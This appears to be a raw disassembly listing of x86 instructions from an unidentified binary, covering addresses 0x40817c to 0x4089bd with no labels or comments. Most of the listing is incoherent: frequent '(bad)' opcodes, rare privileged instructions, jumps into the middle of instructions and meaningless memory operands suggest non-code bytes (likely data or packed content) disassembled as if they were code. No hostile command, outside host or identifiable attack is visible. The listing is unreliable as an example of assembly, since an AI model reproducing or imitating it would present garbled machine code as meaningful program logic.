  40817c:	call   DWORD PTR [ebp+0x2d0019]
  408182:	dec    esi
  408183:	add    bh,bh
  408185:	xchg   ebx,eax
  408186:	add    BYTE PTR [ecx-0x1],al
  408189:	jmp    0x40818a
  40818b:	pop    ss
  40818c:	mov    DWORD PTR [edi+0x6b],edi
  40818f:	add    BYTE PTR [edi],ch
  408191:	add    BYTE PTR ds:0xe7ffff,ah
  408197:	sbb    eax,0x9ffd189
  40819c:	push   DWORD PTR [ecx]
  40819e:	dec    eax
  40819f:	inc    ebp
  4081a1:	(bad)  
  4081a2:	jns    0x4081a4
  4081a4:	add    BYTE PTR [eax+eax*1],bh
  4081a7:	out    0x83,al
  4081a9:	inc    esi
  4081aa:	add    BYTE PTR [ecx-0x524901],dh
  4081b0:	in     eax,0x89
  4081b2:	push   ss
  4081b3:	add    BYTE PTR [eax],al
  4081b5:	(bad)  
  4081b6:	call   FWORD PTR [ecx]
  4081b8:	(bad)  
  4081b9:	cmp    al,0x83
  4081bb:	fcos   
  4081bd:	das    
  4081be:	pop    esi
  4081bf:	add    BYTE PTR [ebp+0x0],bl
  4081c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081c3:	add    bh,bh
  4081c5:	mov    ecx,0x7bff90cc
  4081ca:	push   DWORD PTR [eax+eax*1-0x5c]
  4081ce:	mov    edi,edi
  4081d0:	in     al,0xff
  4081d2:	or     al,BYTE PTR [ebx+0x6a834e00]
  4081d8:	xor    DWORD PTR [ebp-0x1],0x39
  4081dc:	push   DWORD PTR [esi]
  4081de:	mov    bh,bh
  4081e0:	cmp    bh,bh
  4081e2:	or     DWORD PTR [eax],eax
  4081e4:	jmp    FWORD PTR [ebp-0x1]
  4081e7:	idiv   bh
  4081e9:	arpl   WORD PTR [ebx-0x2b8b0068],ax
  4081ef:	add    BYTE PTR [eax],ah
  4081f1:	(bad)  
  4081f2:	jg     0x4081f4
  4081f4:	call   DWORD PTR [ecx-0x1]
  4081f7:	fadd   DWORD PTR [eax]
  4081f9:	and    bh,bh
  4081fb:	sbb    eax,0x7a1383
  408200:	add    eax,0xffffedff
  408205:	call   0x89410b0a
  40820a:	mov    DWORD PTR [ebx-0xff0034],eax
  408210:	into   
  408211:	add    BYTE PTR [eax],dl
  408213:	inc    DWORD PTR [eax]
  408215:	push   esi
  408216:	and    al,0xff
  408218:	icebp  
  408219:	int3   
  40821a:	pushf  
  40821b:	mov    edi,edi
  40821d:	test   eax,0xcc7b831a
  408222:	pop    ds
  408223:	add    DWORD PTR [eax],0x78
  408226:	stos   DWORD PTR es:[edi],eax
  408227:	call   ebp
  408229:	int3   
  40822a:	sbb    eax,0x97d10000
  40822f:	add    BYTE PTR [esi+0xff9583],ch
  408235:	gs jb  0x408237
  408238:	or     DWORD PTR [eax],eax
  40823a:	push   ebp
  40823b:	int3   
  40823c:	(bad)  
  40823d:	jl     0x4082a9
  40823f:	add    BYTE PTR [eax-0x77],bl
  408242:	fwait
  408243:	inc    DWORD PTR [eax]
  408245:	into   
  408246:	push   eax
  408247:	int3   
  408248:	fwait
  408249:	add    BYTE PTR [edi],ch
  40824b:	int3   
  40824c:	mov    DWORD PTR [eax-0x7c267cb9],esi
  408252:	aaa    
  408253:	inc    DWORD PTR [ebx-0x7ff34ed]
  408259:	inc    DWORD PTR ds:0x117000ff
  40825f:	jmp    edi
  408261:	add    BYTE PTR [edi+0x0],cl
  408264:	int3   
  408265:	aam    0xcd
  408267:	jmp    DWORD PTR [edi-0x7676ba01]
  40826d:	out    0x55,eax
  40826f:	jmp    DWORD PTR [ecx-0x34]
  408272:	dec    eax
  408273:	int3   
  408274:	add    BYTE PTR [ecx],ch
  408276:	mov    edi,0x3100fb83
  40827b:	cmp    edi,0xffffffc7
  40827e:	retf   0x68ff
  408281:	add    BYTE PTR [edx-0x1],dh
  408284:	int3   
  408285:	cdq    
  408286:	and    DWORD PTR [eax],eax
  408288:	push   ds
  408289:	add    BYTE PTR [ebx+0x0],cl
  40828c:	dec    DWORD PTR [edi]
  40828e:	add    eax,0xb6ff7b83
  408293:	mov    DWORD PTR [eax],eax
  408295:	in     eax,dx
  408296:	pop    ebp
  408297:	inc    DWORD PTR [esi-0x1]
  40829a:	sbb    eax,DWORD PTR [eax]
  40829c:	and    DWORD PTR [edx+ecx*2],0xffffffff
  4082a0:	lods   al,BYTE PTR ds:[esi]
  4082a1:	add    BYTE PTR [edx],bl
  4082a3:	dec    DWORD PTR [ecx-0x4ff0fa2]
  4082a9:	add    BYTE PTR [esi],al
  4082ab:	(bad)  
  4082ac:	jmp    FWORD PTR ds:0xe700a2
  4082b2:	adc    al,BYTE PTR [eax]
  4082b4:	sub    DWORD PTR [edx+ebx*8+0x0],0x48
  4082b9:	sub    esi,0xffffff83
  4082bc:	add    BYTE PTR [edi+ebp*2],dh
  4082bf:	sbb    DWORD PTR [ebp+0x0],0x2d
  4082c3:	inc    DWORD PTR [ebx-0xdff5a49]
  4082c9:	call   DWORD PTR [ecx-0x34]
  4082cc:	add    BYTE PTR [ecx],bh
  4082ce:	fdiv   st(7),st
  4082d0:	sbb    eax,DWORD PTR [eax]
  4082d2:	add    eax,DWORD PTR [ebx+0x9384ff]
  4082d8:	jmp    0x4082d9
  4082da:	push   ss
  4082db:	add    BYTE PTR [eax],al
  4082dd:	dec    ebp
  4082de:	fld    DWORD PTR [eax]
  4082e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082e1:	call   ebx
  4082e3:	(bad)  
  4082e4:	push   ecx
  4082e6:	popa   
  4082e7:	call   FWORD PTR [esi-0xff1500]
  4082ed:	push   edi
  4082ee:	xor    al,0xff
  4082f0:	sub    eax,0xff002200
  4082f5:	jp     0x408311
  4082f7:	add    cl,dh
  4082f9:	mov    ebx,eax
  4082fb:	add    bh,bh
  4082fd:	(bad)  
  4082fe:	mov    ecx,0x20ffa6ff
  408303:	add    BYTE PTR [eax],al
  408305:	ret    
  408306:	mov    ds:0xbcffc5ff,al
  40830b:	add    BYTE PTR [eax],al
  40830d:	xor    dh,bh
  40830f:	push   edx
  408311:	int3   
  408312:	pop    es
  408313:	(bad)  
  408314:	inc    DWORD PTR [ebp-0x33f7000d]
  40831a:	pop    ss
  40831b:	inc    DWORD PTR [eax]
  40831d:	push   0x6a
  40831f:	mov    DWORD PTR [ebx],edx
  408321:	mov    DWORD PTR [esi+0x3148ff83],edx
  408327:	add    BYTE PTR [eax-0xff8001],al
  40832d:	mov    al,ds:0xff9f899f
  408332:	outs   dx,BYTE PTR ds:[esi]
  408333:	cmp    edi,0x38
  408336:	sbb    bh,bh
  408338:	pop    ecx
  408339:	dec    edi
  40833b:	inc    DWORD PTR [eax]
  40833d:	pop    eax
  40833e:	stos   BYTE PTR es:[edi],al
  40833f:	call   FWORD PTR [eax+eax*1-0x4c33331d]
  408346:	mov    al,ds:0xd3ffc5ff
  40834b:	add    ah,cl
  40834d:	ret    
  40834e:	(bad)  
  408351:	add    BYTE PTR [edi-0x6ab90001],bh
  408357:	int3   
  408358:	add    eax,0x832f83
  40835d:	outs   dx,DWORD PTR ds:[esi]
  40835e:	loopne 0x40835f
  408360:	inc    edi
  408361:	sbb    eax,0xffffff83
  408364:	(bad)  
  408365:	in     eax,dx
  408366:	jns    0x408368
  408368:	sti    
  408369:	add    BYTE PTR [ebx-0x1],bh
  40836c:	mov    DWORD PTR [eax+0x4e],edx
  40836f:	inc    ebx
  408371:	add    BYTE PTR [ecx],dh
  408373:	add    BYTE PTR [eax],al
  408375:	xor    DWORD PTR [esi],0xffffffff
  408378:	in     al,dx
  408379:	push   esi
  40837b:	inc    DWORD PTR [ebx+0x6dff643d]
  408381:	mov    DWORD PTR [edx+0x0],ebx
  408384:	or     DWORD PTR [esi-0x37],0x0
  408388:	jl     0x408389
  40838a:	(bad)  
  40838b:	dec    DWORD PTR [ecx+0x780073e9]
  408391:	add    BYTE PTR [esi],cl
  408393:	add    DWORD PTR [eax],0xffffffd4
  408396:	popf   
  408397:	push   DWORD PTR [ebx+0xffd083]
  40839d:	nop
  40839e:	dec    ebx
  40839f:	sub    DWORD PTR [ebx+0xfffcff],0xffffffd1
  4083a6:	das    
  4083a7:	int3   
  4083a8:	and    edi,edi
  4083aa:	mov    edi,?
  4083ac:	mov    DWORD PTR [edi+ecx*4+0x0],esp
  4083b0:	adc    edi,edi
  4083b2:	jge    0x408337
  4083b4:	add    dl,bh
  4083b6:	mov    al,ds:0x71ff9b83
  4083bb:	inc    DWORD PTR [ebx-0xcff2b5f]
  4083c1:	jmp    DWORD PTR [eax-0x77]
  4083c4:	xor    DWORD PTR [esi],0x33
  4083c7:	add    BYTE PTR [edx-0x1],bh
  4083ca:	sar    bh,cl
  4083cc:	add    BYTE PTR [ebx+0x74],cl
  4083cf:	(bad)  
  4083d0:	mov    edx,0xffff87ff
  4083d5:	or     BYTE PTR [eax+0x75837d83],0xff
  4083dc:	or     DWORD PTR [ebx],0xffffffea
  4083df:	add    BYTE PTR [eax-0x34],dl
  4083e2:	sar    bh,0xff
  4083e5:	push   esp
  4083e6:	add    bh,bh
  4083e8:	scas   eax,DWORD PTR es:[edi]
  4083e9:	add    BYTE PTR [eax],dh
  4083eb:	inc    DWORD PTR [eax]
  4083ed:	ins    BYTE PTR es:[edi],dx
  4083ee:	push   ebx
  4083ef:	call   FWORD PTR [ecx]
  4083f1:	add    bl,al
  4083f3:	inc    DWORD PTR [ebx+0x7b0004fb]
  4083f9:	add    BYTE PTR [esi-0x77],ch
  4083fc:	add    bh,ah
  4083fe:	sub    al,0xff
  408400:	add    edi,edi
  408402:	mov    esp,0x2108ff00
  408407:	add    BYTE PTR [ebp+0xff5900],dl
  40840d:	into   
  40840e:	outs   dx,DWORD PTR ds:[esi]
  40840f:	add    BYTE PTR [esi],bl
  408411:	add    dl,dh
  408413:	add    BYTE PTR [ebx+0x1d83e970],al
  408419:	add    BYTE PTR [edi-0x5c3dff34],bl
  40841f:	call   DWORD PTR [ebx-0x34]
  408422:	hlt    
  408423:	add    BYTE PTR [eax],al
  408425:	mov    ds:0xff9cff00,eax
  40842a:	inc    ebp
  40842b:	add    DWORD PTR [eax],0x6e
  40842e:	pop    esi
  40842f:	(bad)  
  408430:	jmp    0x408431
  408432:	inc    edi
  408433:	add    ah,cl
  408435:	arpl   WORD PTR [esi-0x61006300],si
  40843b:	inc    DWORD PTR [eax]
  40843d:	test   BYTE PTR [ebx+0x0],0x4a
  408441:	add    BYTE PTR [edi+0x389900ff],bh
  408447:	call   ebx
  408449:	add    BYTE PTR [esi+0x5042ccff],bh
  40844f:	and    DWORD PTR [ecx-0xcc00],0xffffff94
  408456:	mov    ch,0xff
  408458:	mov    bl,0xff
  40845a:	jb     0x4083df
  40845c:	adc    DWORD PTR [ecx+eiz*4],0xffffffff
  408460:	and    BYTE PTR [ebx+0x1bffff96],al
  408466:	ret    0x9dff
  408469:	inc    DWORD PTR [esi]
  40846b:	int3   
  40846c:	sbb    DWORD PTR [eax+edi*2-0x52006a7d],0xffffffff
  408474:	dec    DWORD PTR [edi-0x55]
  408477:	add    BYTE PTR [edi-0xfb7d],bh
  40847d:	push   esi
  40847e:	mov    edi,edi
  408480:	cmp    BYTE PTR [ebx-0x13007c90],al
  408486:	jmp    0x9a412f8a
  40848b:	(bad)  
  40848c:	call   DWORD PTR ds:0xffaaffda
  408492:	int3   
  408493:	add    bh,bh
  408495:	ins    DWORD PTR es:[edi],dx
  408496:	(bad)  
  408497:	int3   
  408498:	add    al,0x0
  40849a:	rol    BYTE PTR [ebx-0x92da01],cl
  4084a0:	push   edi
  4084a1:	and    DWORD PTR [edi+edi*8-0x34],0xffffff97
  4084a6:	xchg   ecx,eax
  4084a7:	add    bl,bl
  4084a9:	add    BYTE PTR [eax+0x0],bl
  4084ac:	int3   
  4084ad:	ds fcos 
  4084b0:	mov    edi,edi
  4084b2:	mov    WORD PTR [ebx+0xa9db83],es
  4084b8:	pop    eax
  4084b9:	(bad)  
  4084ba:	clc    
  4084bb:	(bad)  
  4084bc:	inc    DWORD PTR ds:0xffffd0
  4084c2:	mov    edi,edi
  4084c4:	add    BYTE PTR [ebx+0x6b],dh
  4084c7:	jmp    FWORD PTR [ebp+0xff9bcc]
  4084cd:	repz and bh,bh
  4084d0:	aaa    
  4084d1:	add    BYTE PTR [esi-0x1],ah
  4084d4:	jmp    DWORD PTR [eax+0x25]
  4084d7:	mov    DWORD PTR [edx],edx
  4084d9:	(bad)  
  4084da:	cmp    eax,DWORD PTR [eax]
  4084dc:	call   esp
  4084de:	rol    DWORD PTR [eax],0xb0
  4084e1:	jmp    DWORD PTR [edx]
  4084e3:	(bad)  
  4084e4:	(bad)  
  4084e5:	sti    
  4084e6:	ror    DWORD PTR [ecx-0x39000e],1
  4084ec:	add    BYTE PTR [edx],al
  4084ee:	into   
  4084ef:	xor    DWORD PTR [edi+edi*8-0x18],0xffffffcc
  4084f4:	add    BYTE PTR [ecx],ah
  4084f6:	jle    0x4084f8
  4084f8:	jb     0x4084fa
  4084fa:	cmp    bh,0x89
  4084fd:	imul   edx,edx,0xffffff89
  408500:	je     0x408502
  408502:	push   es
  408503:	cmp    edi,0x1b
  408506:	data16 (bad) 
  408508:	cmp    bh,bh
  40850a:	popa   
  40850b:	int3   
  40850c:	dec    DWORD PTR [ecx+0xa40065]
  408512:	pop    es
  408513:	(bad)  
  408514:	call   DWORD PTR [edx+0x47]
  408517:	cmp    DWORD PTR [ebx+eax*4+0x65],0x0
  40851c:	add    BYTE PTR [ebp+0x39],cl
  40851f:	inc    edi
  408521:	mov    DWORD PTR [ebx-0x1],esp
  408524:	cmp    eax,0x3
  408527:	xor    DWORD PTR [edi+edi*8],0xffffffff
  40852b:	add    bh,bh
  40852d:	and    cl,BYTE PTR [bx+di-0x9d]
  408532:	push   edx
  408533:	add    bh,bh
  408535:	or     eax,0xfff4ff73
  40853a:	sub    edi,edi
  40853c:	and    DWORD PTR [edi],0xffffffb1
  40853f:	add    cl,bl
  408541:	cmp    DWORD PTR [edi],0x0
  408544:	jmp    DWORD PTR [ebx-0x9]
  408547:	mov    DWORD PTR [eax],esi
  408549:	jmp    FWORD PTR [edi]
  40854b:	add    ah,cl
  40854d:	or     DWORD PTR [edi+0x0],edx
  408550:	mov    esp,0xff897100
  408555:	(bad)  
  408556:	nop
  408557:	inc    DWORD PTR [eax]
  408559:	mov    DWORD PTR [edi-0x1],edx
  40855c:	add    BYTE PTR [ebx+0x15],bh
  40855f:	jmp    FWORD PTR ds:0xffff42ff
  408565:	sub    esi,DWORD PTR [edi-0x1]
  408568:	mov    DWORD PTR [eax],eax
  40856a:	fadd   DWORD PTR [eax]
  40856c:	add    BYTE PTR [ebp+eiz*8-0x5600507d],bl
  408573:	(bad)  
  408574:	inc    DWORD PTR [edi-0x32ff6f]
  40857a:	inc    ebp
  40857b:	inc    DWORD PTR [eax]
  40857d:	lock ret 
  40857f:	add    BYTE PTR [edi-0x77],bh
  408582:	clc    
  408583:	dec    esp
  408585:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408586:	dec    ebp
  408587:	push   DWORD PTR [edi+edi*8-0x60]
  40858b:	add    bh,bh
  40858d:	dec    esp
  40858e:	sub    al,0x83
  408590:	sbb    eax,0xffffe0cc
  408595:	lds    edi,FWORD PTR [edx+0x800a1ff]
  40859b:	add    bh,bh
  40859d:	fcom   QWORD PTR [edx]
  40859f:	jmp    FWORD PTR [edi-0x7d]
  4085a2:	inc    esp
  4085a3:	inc    DWORD PTR [ebx-0x2500e717]
  4085a9:	add    BYTE PTR [ebp+0xcb0ffcc],bl
  4085af:	mov    esp,eax
  4085b1:	mov    DWORD PTR [ebp-0x1],edx
  4085b4:	add    BYTE PTR [eax+0x58],ah
  4085b7:	cmp    DWORD PTR [ebx+0x0],0xffffffdc
  4085bb:	cmp    edi,0x7
  4085be:	sahf   
  4085bf:	dec    edi
  4085c1:	xor    DWORD PTR [edx+0x0],0xffffff89
  4085c5:	sbb    DWORD PTR [eax],edx
  4085c7:	dec    DWORD PTR [edx-0x33a877]
  4085cd:	pop    ebp
  4085ce:	cld    
  4085cf:	inc    DWORD PTR [eax-0x1]
  4085d2:	(bad)  
  4085d3:	inc    DWORD PTR [ebx-0x3a3359da]
  4085d9:	call   DWORD PTR [ecx+0x3241cc00]
  4085df:	dec    DWORD PTR [eax+0x0]
  4085e2:	jmp    0x1483:0x44418300
  4085e9:	call   esp
  4085eb:	add    BYTE PTR [ebx-0x7d00f17f],al
  4085f1:	add    BYTE PTR [ecx],bh
  4085f3:	add    DWORD PTR [eax],0xffffff8e
  4085f6:	sti    
  4085f7:	inc    DWORD PTR [eax-0x7c01]
  4085fd:	(bad)  
  4085fe:	clc    
  4085ff:	add    BYTE PTR [edx-0x1],ch
  408602:	pop    esp
  408603:	add    DWORD PTR [eax],0xffffffb9
  408606:	lea    eax,[eax]
  408608:	push   0x83ff8aff
  40860d:	sar    dl,1
  40860f:	inc    DWORD PTR [ecx-0x7d]
  408612:	stc    
  408613:	inc    DWORD PTR [eax]
  408615:	pusha  
  408616:	daa    
  408617:	add    BYTE PTR [edi],cl
  408619:	push   DWORD PTR [ecx+0xbccffff]
  40861f:	add    BYTE PTR [esi],dh
  408621:	add    ah,ah
  408623:	mov    DWORD PTR [eax],eax
  408625:	jns    0x4086a0
  408627:	dec    DWORD PTR [ecx-0x1]
  40862a:	test   edi,edi
  40862c:	jmp    FWORD PTR [ebp+ecx*4+0x0]
  408630:	sbb    eax,0xff9aff
  408635:	mov    edi,DWORD PTR [ebx-0x4a005334]
  40863b:	(bad)  
  40863c:	jmp    ebx
  40863e:	or     bh,bh
  408640:	mov    esi,0xffffbeff
  408645:	mov    dl,0xfa
  408647:	add    BYTE PTR [eax+eax*1],bl
  40864a:	cld    
  40864b:	(bad)  
  40864c:	jmp    ecx
  40864e:	test   DWORD PTR [ecx+0xfdff10],0xffce3e00
  408658:	pop    edi
  408659:	add    dh,bl
  40865b:	add    BYTE PTR [ebx-0x3e7c6747],al
  408661:	add    BYTE PTR [esp+ecx*8],ch
  408664:	int3   
  408665:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408666:	lahf   
  408667:	dec    DWORD PTR [ecx-0x337401]
  40866d:	ja     0x408603
  40866f:	(bad)  
  408670:	add    BYTE PTR ds:[eax+0x1ec38989],bl
  408677:	call   FWORD PTR [eax]
  408679:	push   ecx
  40867b:	mov    DWORD PTR [eax],eax
  40867d:	mov    DWORD PTR ds:0xa2ff2900,eax
  408683:	inc    DWORD PTR [ebx-0x5576fbb6]
  408689:	add    ah,bl
  40868b:	cmp    edi,0xffffff85
  40868e:	mov    ds:0x5fffa100,al
  408693:	mov    edi,edi
  408695:	xor    al,0x88
  408697:	dec    DWORD PTR [ebx+eax*4+0x23ffff83]
  40869e:	xor    eax,0x5002b00
  4086a3:	dec    DWORD PTR [ecx-0x4cff6c69]
  4086a9:	push   DWORD PTR [ebx+0x257d0000]
  4086af:	and    DWORD PTR [eax+0x830b83],0xffffffb4
  4086b6:	call   0xe83fa6bb
  4086bb:	inc    DWORD PTR [ebx+0x7dff7efb]
  4086c1:	add    BYTE PTR [edi],bh
  4086c3:	inc    DWORD PTR [eax]
  4086c5:	neg    BYTE PTR [eax+0xb5ff]
  4086cb:	add    BYTE PTR [eax],al
  4086cd:	cmp    DWORD PTR es:[eax],eax
  4086d0:	das    
  4086d1:	add    BYTE PTR [ebx+0x0],dh
  4086d4:	or     DWORD PTR [ecx],0x66
  4086d7:	int3   
  4086d8:	jo     0x40865d
  4086da:	sbb    eax,0xf93affcc
  4086df:	inc    edi
  4086e1:	call   ecx
  4086e3:	(bad)  
  4086e4:	inc    edi
  4086e6:	dec    esp
  4086e7:	push   DWORD PTR [eax]
  4086e9:	cmp    DWORD PTR ds:0x8a0f8900,0x0
  4086f0:	in     eax,dx
  4086f1:	xor    ebp,0xffffffff
  4086f4:	mov    DWORD PTR [eax-0x76dc00e1],ebp
  4086fa:	add    BYTE PTR [ebx-0xa8d37d],0x95
  408701:	int3   
  408702:	mov    bl,0x89
  408704:	add    BYTE PTR [edx],bl
  408706:	pop    ss
  408707:	inc    DWORD PTR [edi+0x8ff]
  40870d:	es (bad) 
  40870f:	jmp    ecx
  408711:	add    BYTE PTR [eax-0x7d],dl
  408714:	cmp    DWORD PTR ds:0xd2ffdf,0xffffff8d
  40871b:	add    BYTE PTR [eax],al
  40871d:	mov    al,0xf2
  40871f:	mov    edi,edx
  408721:	add    BYTE PTR [ebp+0x0],cl
  408724:	int3   
  408725:	mov    ecx,0x8981ffd4
  40872a:	xchg   ebx,eax
  40872b:	cmp    edi,0x17
  40872e:	fwait
  40872f:	inc    DWORD PTR [ecx]
  408731:	add    BYTE PTR [ecx+0x0],dl
  408734:	adc    esp,0xffffff98
  408737:	add    BYTE PTR [eax],cl
  408739:	call   FWORD PTR [eax-0x63430000]
  40873f:	jmp    DWORD PTR [eax-0x77]
  408742:	rol    BYTE PTR [eax],1
  408744:	int3   
  408745:	mov    al,0x80
  408747:	add    bl,ah
  408749:	int3   
  40874a:	ja     0x40874b
  40874c:	(bad)  
  40874d:	jle    0x408737
  40874f:	int3   
  408750:	ret    
  408751:	push   DWORD PTR [edx-0x63237700]
  408757:	inc    ebx
  408759:	cmp    ecx,0xffffffff
  40875c:	add    bl,bl
  40875e:	mov    cl,0x83
  408760:	xchg   ebx,eax
  408761:	jmp    DWORD PTR [ebp+0x7e70ffff]
  408767:	add    BYTE PTR [edi+edi*8],cl
  40876a:	pop    ecx
  40876b:	add    BYTE PTR [eax],al
  40876d:	xor    DWORD PTR [edi+edi*8-0x3e],esp
  408771:	(bad)  
  408772:	cmp    bh,bh
  408774:	call   FWORD PTR [ebx+0x438923]
  40877a:	(bad)  
  40877c:	sbb    DWORD PTR [edx-0x6f],0xffffff83
  408780:	clc    
  408781:	inc    DWORD PTR [esi]
  408783:	inc    DWORD PTR [eax]
  408785:	mov    esi,0xff36ffeb
  40878a:	stos   DWORD PTR es:[edi],eax
  40878b:	add    BYTE PTR [eax],al
  40878d:	arpl   bp,sp
  40878f:	call   eax
  408791:	jmp    FWORD PTR [ebx]
  408793:	add    ah,cl
  408795:	push   ss
  408796:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408797:	call   FWORD PTR ds:0xffff8683
  40879d:	cwde   
  40879e:	dec    esi
  40879f:	add    BYTE PTR [ebp+0xff75ff],dh
  4087a5:	mov    edx,0xff44cc68
  4087aa:	adc    al,BYTE PTR [eax]
  4087ac:	mov    DWORD PTR [eax+esi*2],edx
  4087af:	add    BYTE PTR [edx],al
  4087b1:	adc    DWORD PTR [ebx+0x1ab583ff],0xffffffff
  4087b8:	mov    esi,0x83832eff
  4087bd:	inc    BYTE PTR [edi-0x67ff2201]
  4087c3:	add    BYTE PTR [ebx+0x5fff5808],al
  4087c9:	jmp    DWORD PTR [edx]
  4087cb:	(bad)  
  4087cc:	call   DWORD PTR [edi-0x6c]
  4087cf:	int3   
  4087d0:	mov    esp,0xff00b0ff
  4087d5:	adc    ebp,edi
  4087d7:	inc    DWORD PTR [ecx-0x1]
  4087da:	rol    BYTE PTR [eax],1
  4087dc:	jmp    esi
  4087de:	fwait
  4087df:	mov    DWORD PTR [ebx+eax*4+0x730083fc],esi
  4087e6:	pop    edx
  4087e7:	jmp    DWORD PTR [edi+edi*8+0x15ffff1b]
  4087ee:	imul   edi,edi,0x5e
  4087f1:	mov    DWORD PTR [esi-0x1],ecx
  4087f4:	jmp    FWORD PTR [esi+0x6e]
  4087f7:	sub    ebx,0xffffff83
  4087fa:	dec    eax
  4087fb:	add    bh,bh
  4087fd:	pop    edx
  4087fe:	cmp    edi,edi
  408800:	hlt    
  408801:	jmp    esi
  408803:	add    BYTE PTR [eax],al
  408805:	jno    0x4087da
  408807:	(bad)  
  408808:	mov    edi,0xffff8883
  40880d:	jge    0x408796
  40880f:	mov    ecx,ecx
  408811:	dec    DWORD PTR [edi]
  408813:	inc    DWORD PTR [eax]
  408815:	out    dx,al
  408816:	cmp    eax,0x8900ddff
  40881b:	int3   
  40881c:	add    edx,0xffffffd8
  40881f:	dec    DWORD PTR [edx]
  408821:	push   DWORD PTR [eax+0x0]
  408824:	add    BYTE PTR [edi+0x33],cl
  408827:	add    BYTE PTR [edi+0xff1183],ch
  40882d:	cmp    BYTE PTR [esp+ecx*8-0x7cb90092],dl
  408834:	inc    DWORD PTR [edi+0x38]
  408837:	jmp    DWORD PTR [edx-0x77]
  40883a:	sbb    esp,ecx
  40883c:	add    BYTE PTR [edi-0xb],cl
  40883f:	int3   
  408840:	xchg   esi,eax
  408841:	int3   
  408842:	out    dx,eax
  408843:	(bad)  
  408844:	jmp    DWORD PTR [esi-0xea0095]
  40884a:	push   es
  40884b:	mov    esp,ecx
  40884d:	shl    bh,cl
  40884f:	jmp    DWORD PTR [eax]
  408851:	adc    DWORD PTR [eax+eax*1],0xffffffff
  408855:	in     eax,dx
  408856:	mov    edx,0xd200a300
  40885b:	(bad)  
  40885c:	call   DWORD PTR [edx+0x74]
  40885f:	int3   
  408860:	mov    eax,DWORD PTR [eax]
  408862:	adc    DWORD PTR [ecx+0x62a100],ecx
  408868:	(bad)  
  408869:	int3   
  40886a:	aas    
  40886b:	cmp    edi,0x68
  40886e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40886f:	int3   
  408870:	ins    DWORD PTR es:[edi],dx
  408871:	add    BYTE PTR [eax+eax*1+0x86fa83],al
  408878:	or     BYTE PTR [eax],al
  40887a:	mov    edi,0xbb2ff00
  40887f:	add    BYTE PTR [edx],dl
  408881:	adc    ebx,0x0
  408884:	add    bl,bh
  408886:	(bad)  
  408887:	(bad)  
  408888:	(bad)  
  408889:	inc    DWORD PTR [eax-0x21440001]
  40888f:	dec    DWORD PTR [edi-0x7c7c0d01]
  408895:	test   DWORD PTR [esp+ecx*8-0x7],0xff00b8cc
  40889d:	lock inc BYTE PTR [ebx-0x7c66007a]
  4088a4:	dec    ebx
  4088a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088a7:	add    cl,cl
  4088a9:	mov    DWORD PTR [ebx],esi
  4088ab:	add    BYTE PTR [eax],al
  4088ad:	push   ecx
  4088ae:	pop    ebp
  4088af:	call   FWORD PTR [ecx+0xcca2ff]
  4088b5:	es imul edi,edi,0x41
  4088b9:	call   FWORD PTR [edi]
  4088bb:	mov    DWORD PTR [ecx-0x34ffc3cb],ecx
  4088c1:	inc    DWORD PTR [edx+0x65a7cc00]
  4088c7:	cmp    DWORD PTR [ecx+0x836300],0xffffffcb
  4088ce:	or     eax,0x90ff3f00
  4088d3:	add    BYTE PTR [eax],al
  4088d5:	cwde   
  4088d6:	mov    dh,0xff
  4088d8:	jge    0x4088d9
  4088da:	mov    ch,0xff
  4088dc:	call   FWORD PTR [edi]
  4088de:	add    eax,0x1489b600
  4088e3:	(bad)  
  4088e4:	push   esp
  4088e6:	add    edi,edi
  4088e8:	sbb    eax,0x83cce6ff
  4088ed:	icebp  
  4088ee:	in     eax,dx
  4088ef:	int3   
  4088f0:	bnd jmp ecx
  4088f3:	(bad)  
  4088f4:	inc    DWORD PTR [ebx-0x6c]
  4088f7:	mov    DWORD PTR [ecx+ecx*4-0x28ff006e],ecx
  4088fe:	jb     0x4088cc
  408900:	imul   edi,edi,0xffffff85
  408903:	add    BYTE PTR [ebx+0x77004441],al
  408909:	(bad)  
  40890a:	in     al,dx
  40890b:	(bad)  
  40890c:	call   ecx
  40890e:	notrack call DWORD PTR [ecx-0x34]
  408912:	jo     0x4088e0
  408914:	add    ch,ah
  408916:	jg     0x408918
  408918:	dec    eax
  408919:	dec    DWORD PTR [ebx+eax*4-0x1]
  40891d:	std    
  40891e:	bound  eax,QWORD PTR [eax]
  408920:	mov    al,0xff
  408922:	out    0x0,eax
  408924:	int3   
  408925:	mov    eax,0xccb9ffd7
  40892a:	mov    eax,ds:0x432dff83
  40892f:	push   eax
  408931:	(bad)  
  408932:	jmp    0xb2048837
  408937:	add    BYTE PTR [ecx-0x7cff8200],al
  40893d:	fld    DWORD PTR [esi+0xa0002cc]
  408943:	dec    DWORD PTR [ecx-0x3c764a17]
  408949:	add    BYTE PTR [edx],ch
  40894b:	add    BYTE PTR [ecx+0x3ff9d1d],cl
  408951:	add    dl,bl
  408953:	(bad)  
  408954:	(bad)  
  408955:	mov    edx,0xa1ff3a
  40895a:	pop    edx
  40895b:	add    bh,bh
  40895d:	mov    fs,edx
  40895f:	add    BYTE PTR [ebx],cl
  408961:	int3   
  408962:	sahf   
  408963:	add    BYTE PTR [eax],al
  408965:	cs push ecx
  408967:	inc    DWORD PTR [ecx-0x7cd600]
  40896d:	mov    eax,0x83fa838f
  408972:	test   DWORD PTR [eax],0xcc50dc00
  408978:	in     eax,dx
  408979:	push   DWORD PTR [eax+eax*1-0x1]
  40897d:	and    eax,0xff8d008a
  408982:	call   0xa9ff:0x5aea0000
  408989:	add    BYTE PTR [edi+edi*8],dh
  40898c:	add    BYTE PTR [edi],dh
  40898e:	and    al,0xff
  408990:	aaa    
  408991:	call   FWORD PTR [eax-0x57680001]
  408997:	mov    edi,edx
  408999:	add    cl,bh
  40899b:	mov    DWORD PTR [eax],eax
  40899d:	pop    edi
  40899e:	test   BYTE PTR [eax],al
  4089a0:	(bad)  
  4089a1:	call   DWORD PTR [edx-0x34]
  4089a4:	sub    edi,0xffffffb1
  4089a7:	add    BYTE PTR [eax-0xff4f7d],bh
  4089ad:	call   0xff470cf4
  4089b2:	rol    DWORD PTR [eax],0x0
  4089b5:	cmp    ah,dl
  4089b7:	add    BYTE PTR [edx+0x8904ff],dl
  4089bd:	mov    ebp,0x8985ff9e
